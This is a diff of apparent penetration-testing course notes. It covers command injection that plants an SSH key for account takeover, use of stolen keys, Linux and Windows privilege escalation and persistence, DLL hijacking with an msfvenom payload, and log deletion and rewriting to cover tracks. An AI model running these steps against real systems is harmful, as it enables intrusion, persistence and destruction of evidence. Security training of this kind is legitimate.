@@ -44,6 +44,7 @@ Section 2: Scanning & Recon
                 nmap --script-args-file <filename>
                 nmap --script-help <filename>|<category>|<directory>
                 nmap --script-trace
+        - GREAT HTTP nmap script: nmap --script=http-enum.nse [IP]
 
 
 
@@ -67,23 +68,24 @@ Section 3: Vulnerability & Exploitation Research
         - Document results
 
 
-Section 4:
+Section 4: SSH Key Shenanigans via SQL
 
 Run ";whoami" to see if input is vulnerable to SQL command injection
 
-Once at commmand injection location:
-Use the sneaky method (;[command]) to cat /etc/passwd and find home directory of www-data
-Upload copy of SSH RSA token to that home directory:
-ls -la /var/www (home dir) to see whether a .ssh file is located in the home dir
-mkdir /var/www/.ssh
-ON CMD:
-ls -la ../../.ssh/
-ssh-keygen -t rsa -b 4096 (to generate keys in the first place)
-cat ../../.ssh/id_rsa.pub (public - copy everything in this file)
-cat ../../.ssh/id_rsa (private)
+Once at remote commmand injection location:
+        Use the sneaky method (;[command]) to cat /etc/passwd and find home directory of www-data
+        Upload copy of SSH RSA token to that home directory:
+        ls -la /var/www (home dir) to see whether a .ssh file is located in the home dir
+        mkdir /var/www/.ssh
+ON LOCAL CMD:
+        ls -la ../../.ssh/
+        ssh-keygen -t rsa -b 4096 (to generate keys in the first place)
+        cat ../../.ssh/id_rsa.pub (public - copy EVERYTHING in this file)
+        cat ../../.ssh/id_rsa (private)
 IN INJECTION SPOT:
-;echo "[PASTE]" >> /var/www/.ssh/authorized_keys
-ON CMD: ssh www-data@(target IP) (hijacks this user account on the target)
+        ;echo "[PASTE]" >> /var/www/.ssh/authorized_keys
+ON CMD:
+        ssh www-data@(target IP) (hijacks this user account on the target)
 
 
 Section 5: SQL
@@ -416,6 +418,7 @@ Section 9: Post-Exploitation
         - ps -elf // tasklist /v
         - chkconfig (SysV) or systemctl --type=service (SystemD) // tasklist /svc
         - ip a // ipconfig /all
+        - ls /etc/cron.d OR cat /etc/crontab OR ls -la /var/spool/cron/crontabs
 - Using stolen SSH keys:
         - chmod 600 /home/student/stolenkey
         - ssh -i /home/stdent/stolenkey jane@1.2.3.4 (tells SSH to utilize the specified stolen private key to authenticate with the jane@1.2.3.4 public key)
@@ -425,4 +428,166 @@ ssh -S /tmp/jump jump -O forward -D 9050 ## Dynamic forwarding
 Found 1.2.3.4, now nmap/nc to find port 22 open
 ssh -S /tmp/jump jump -O forward -L4207:1.2.3.4:22 ## Port Forward
 scp -P 1212 file.sh student@localhost:/home/student/Documents ## SCP file.sh to remote host
+
+
+Section 10: Privilege Escalation
+- Possible objectives (persistence): Includes these and more
+        - Adding/hijacking account
+        - Boot process persistence
+        - Adding/modifying CRON jobs
+        - Adding kernel module w/ a backdoor
+        - Setting SUID/SGID bit on a critical command that will allow you to regain root privs if you need to
+- Privilege escalation techniques:
+        - Sudo -l (find out sudo permissions, can be used for further gimmicks or you might already be able to do everything you need to)
+        - SUID/SGID allows a program to make changes as root even if it is not run as root (this is why the passwd command can make changes to the /etc/shadow file even when run as Sonnyjim)
+                - search for SUID bit programs: find / -type f -perm /6000 -ls 2>/dev/null (both SUID & SGID)
+                - search for SUID bit programs: find / -type f -perm /4000 -ls 2>/dev/null
+                - search for SGID bit programs: find / -type f -perm /2000 -ls 2>/dev/null
+        - https://gtfobins.github.io/ (great website for finding out how any particular command can be abused to gain privilege escalation if it has sudo/SUID/SGID permissions)
+- Insecure permissions: 
+        - CRON (cron itself runs as root, so if you can add something in there, you can get it to run that command as root)
+                - In particular, if there is a script CRON is set to execute regularly and you have permissions to edit that script, bingo
+        - World-Writable Files & Directories (incl. scripts that CRON runs as mentioned above)
+                - find / -type f -writable -o -type d -writable 2>/dev/null (world-writable)
+                - find / -type f -perm /2 -o -type d -perm /2 2>/dev/null (writable by "others")
+        - Dot "." in PATH
+                - Make your own binary in the current working directory named the same as a legit binary (must add executable bit - the "x" in rwx - for this to work)
+                - Insert "." at the beginning of PATH
+                - Shell will look in current working directory first, and the shell will execute your binary
+                - Best practice for masquerading is to make the command do what you want silently, then do the actual legit binary action so it looks like all is normal
+- Check crontab: crontab -e (minute / hour / day of the month / month / day of the week / [command] )
+- Software vulnerabilities
+- Unpatched Kernel vulnerabilities
+- Choose the means of access that is most commonly used on the network - if RDP is a normal thing, use RDP. If SSH traffic is common, use SSH. etc.
+
+
+Section 11: Covering Tracks & Masquerading
+- Ways to figure out init type:
+        ls -latr /proc/1/exe
+        stat /sbin/init
+        man init
+        init --version
+        ps 1
+- Auditing systemV (ausearch pulls from audit.log):
+        ausearch -p 22
+        ausearch -m USER_LOGIN -sv no
+        ausearch -ua edwards -ts yesterday -te now -i
+- Auditing systemD:
+        journalctl _TRANSPORT=audit
+        journalctl _TRANSPORT=audit | grep 603
+- Crucial logs for covering tracks (typically housed in /var/log):
+        - auth.log/secure - Logins/authentications
+        - lastlog - Each users' last successful login time
+        - btmp - Bad login attempts
+        - sulog - Usage of SU command
+        - utmp - Currently logged in users (W command)
+        - wtmp - Permanent record on user on/off
+- Working with logs:
+        file /var/log/wtmp
+        find /var/log -type f -mmin -10 2> /dev/null
+        journalctl -f -u ssh
+        journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+- Reading files (control output with | and "more")
+        cat /var/log/auth.log | egrep -v "opened|closed"
+        awk '/opened/' /var/log/auth.log
+        last OR lastb OR lastlog
+        strings OR dd            # for data files
+        more /var/log/syslog
+        head/tail
+- Cleaning logs: 
+        - ALWAYS save the INODE before starting cleaning!
+        - Inode is essentially the index of files on the linux file system. Commands like mv, cp, cat will all affect the inode.
+        - After finishing cleanup, overwrite the new Inode with the old one to make it look like nothing happened
+- Get rid of log: rm -rf /var/log/...
+- Clear log: 
+        cat /dev/null > /var/log/...
+        echo > /var/log/...
+- Precise log cleaning (remove - grep): egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+- Precise log cleaning (replace - sed): cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+- Use Timestomp to change access/modify/change times
+        touch -c -t 201603051015 1.txt   # Explicit
+        touch -r 3.txt 1.txt    # Reference
+- Remote logging: check the /etc/rsyslog.conf (older version) or /etc/rsyslog.d/* (newer versions)
+        - Find out which one via: grep "IncludeConfig" /etc/rsyslog.conf
+        - Know which server remote logs are being shipped to & which logs are being shipped. Be thorough!
+- ALWAYS MAKE BACKUPS OF ANY FILE YOU ARE CHANGING ON A TARGET MACHINE
+
+
+Section 12: Windows Privilege Escalation
+- To check UAC Settings: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+- When running a program:
+        - asInvoker = run as me (no special privs)
+        - highestAvailable = run as administrator (admin privs)
+- Schtasks vulnerabilities: schtasks /query /fo LIST /v
+        - schtasks permission level considerations: what is your objective? do you need to blend in?
+- Service vulnerabilities:
+        wmic service list full
+        sc query
+- Vulnerable service steps:
+        - Identify Vulnerability
+        - Validate permissions
+        - Validate Executable Paths
+        - Replace with Malicious File
+- DLL Hijacking steps:
+        - Identify Vulnerability
+        - Take advantage of the default search order for DLLs
+        - NAME_NOT_FOUND present in executable’s system calls
+        - Validate permissions
+        - Create and transfer Malicious DLL
+- DLL Search Order:
+        - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+        - The directory the the Application was run from (THIS ONE IS CRITICAL)
+        - The directory specified in in the C+ function GetSystemDirectory()
+        - The directory specified in the C+ function GetWindowsDirectory()
+        - The current directory
+- Other vulnerabilities: unpatched kernel vulnerabilities, unpatched systems, unpatched applications
+- Persistence must survive reboots, credential changes, DHCP IP reassignment, and more
+        - Considerations: file naming, file location, timestomping, port selection, etc.
+- Critical registry locations:
+        - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+        - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+        - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+        - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+- Services usually run at startup, perform multiple functions, and typically require administrative access to modify in any way
+- To make a service with a pre-made exe:
+        .\sc.exe create HowdyService binpath="C:\Program Files (x86)\Howdy\howdy.exe" displayname="HowdyService" start=auto
+        icacls "C:\Program Files (x86)\Howdy" /grant BUILTIN\Users:W
+        - Open "Services" app and scroll down to verify it actually worked and the service exists now
+        - Open "Task Scheduler" app -> Create Task -> Change User or Group -> type "System" -> click "Check Names" -> OK ->
+        - -> General tab -> Name "HowdyTask
+        - -> Triggers tab -> New -> Begin the task "At startup" -> check or uncheck "Enabled" depending on your objective ->
+        - -> Actions Tab -> New -> Browse -> Howdy.exe
+- To take advantage of a scheduled service task that already exists:
+        - Open "Services" app. Anything with no description or otherwise out of place is likely a user-created service that can be taken advantage of
+                - Right click -> "Properties" -> look for path to executable & who the service runs as
+        - Navigate to the executable path and check write permissions to the folder it's in (if you can make and save a text file, you know you can write to that directory)
+        - If you can write to the exe file, 
+        net use Z: "\\http://live.sysinternals.com" /persistent:yes
+        Z:
+        .\Procmon.exe -accepteula
+        - Within Process Monitor -> Filter -> Filter ->
+        -> Process Name contains howdy.exe -> Add
+        -> Result is NAME NOT FOUND -> Add
+        -> Path contains .dll -> Add -> Apply -> OK
+        - To test, turn off everything in Virus & Threat Protection -> Virus & Threat Protection Settings, in Windows Security app, and then run the exe manually
+        - All of the listed dll locations are potential locations where you can create your own DLL that the program will then happily execute
+- Craft a payload:
+        - (from my local ip) msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+                - (payload that will run whoami and output it to a txt file you can read)
+        - scp student@[local ip]:/home/student/SSPICLI.dll .
+        - To kill: (get-process | ?{$_.name -like "howdy"}).kill() (should output a "cannot call a method on null valued expression" error)
+
+Covering Tracks:
+- Audit Logging:
+        - Show all audit category settings: auditpol /get /category:*
+        - Show all failed & successful audits: auditpol /get /category:* | findstr /i "success failure"
+- Important Microsoft Event IDs:
+        - 4624/4625: Successful/failed login
+        - 4720: Account created
+        - 4672: Administrative user logged on
+        - 7045: Service created
+
+
+
+
 
